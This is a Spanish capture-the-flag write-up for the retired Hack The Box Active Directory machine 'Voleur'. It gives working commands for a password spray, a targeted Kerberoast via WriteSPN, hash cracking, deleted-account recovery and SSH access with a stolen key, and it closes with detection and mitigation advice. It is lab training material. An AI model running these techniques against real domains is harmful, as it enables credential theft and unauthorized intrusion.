---
machine: Voleur
os: Windows
difficulty: Medium
platform: Hack The Box
category: Active Directory
state: Retired
pwned: false
tags: [windows, active-directory, kerberoast, write-spn, tombstone, ssh]
---

# Voleur — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin credenciales ni flags reales.

## Resumen

DC con shares `HR` e `IT`. Un Excel de revisión de accesos contiene usuarios y contraseñas; el spray identifica `svc_ldap` y `svc_iis`. `svc_ldap` tiene `WriteSPN` sobre `svc_winrm`, lo que permite un Kerberoast dirigido. Tras crackear el TGS y entrar por WinRM, se encadena un ACL hasta `svc_ldap`, se recupera una cuenta borrada (`todd.wolfe`) y se llega a `svc_backup` por SSH en el puerto 2222.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
netexec smb <IP> --shares
netexec smb <IP> -u '' -p '' --shares
```

Los shares `HR` e `IT` son legibles. Se descarga `Access_Review.xlsx` y se extraen usuarios/contraseñas con `openpyxl` o convirtiendo a CSV. No se publican los valores.

```bash
netexec smb <IP> -u users.txt -p passwords.txt --continue-on-success
```

El spray devuelve dos cuentas de servicio válidas. Se enumera BloodHound con `svc_ldap`:

```bash
bloodhound-python -u svc_ldap -p '<PASSWORD>' -d voleur.htb -ns <IP> -c All
```

## Acceso inicial

BloodHound muestra `WriteSPN` sobre `svc_winrm`. Se añade un SPN temporal y se pide un TGS:

```bash
bloodyAD -d voleur.htb -k --host dc.voleur.htb -u svc_ldap -p '<PASSWORD>' \
  set object svc_winrm servicePrincipalName -v 'http/whatever'
impacket-GetUserSPNs voleur.htb/svc_ldap:'<PASSWORD>' -dc-ip <IP> -request
```

El TGS se crackea con hashcat modo `13100` y se entra por WinRM:

```bash
hashcat -m 13100 svc_winrm.tgs rockyou.txt
netexec winrm <IP> -u svc_winrm -p '<PASSWORD>'
```

## Escalada

Desde `svc_winrm` se abusa del ACL para llegar a `svc_ldap`; después se recupera la cuenta eliminada `todd.wolfe`. En entornos con AD Recycle Bin se consulta el objeto borrado; también se puede usar el módulo `tombstone` de NetExec para leer los atributos del tombstone.

```bash
netexec ldap <IP> -u svc_ldap -p '<PASSWORD>' -M tombstone
```

La contraseña recuperada da acceso SMB. La clave SSH de `svc_backup` se obtiene del perfil o del share y se usa en el puerto 2222:

```bash
ssh -i id_rsa -p 2222 svc_backup@dc.voleur.htb
```

## Flags

- `user.txt`: `<USER_FLAG>`
- `root.txt`: `<ROOT_FLAG>`

## Lecciones

- Un inventario de accesos en un share es un diccionario de credenciales.
- `WriteSPN` permite Kerberoast dirigido sin ser administrador.
- Los objetos borrados pueden conservar atributos y credenciales.
- El puerto SSH 2222 en un DC es una vía lateral poco habitual.

## Detección y mitigación

- No guardar contraseñas en Excel ni en shares de departamento.
- Auditar `WriteSPN`, cambios de `servicePrincipalName` y peticiones TGS 4769 anómalas.
- Restringir la lectura de objetos tombstone y del AD Recycle Bin.
- Rotar credenciales de servicio y revisar cuentas borradas con privilegios.

## Referencias

- <https://0xdf.gitlab.io/2025/11/01/htb-voleur.html>
- <https://learn.microsoft.com/en-us/windows/win32/adschema/a-serviceprincipalname>
- <https://attack.mitre.org/techniques/T1558/003/>
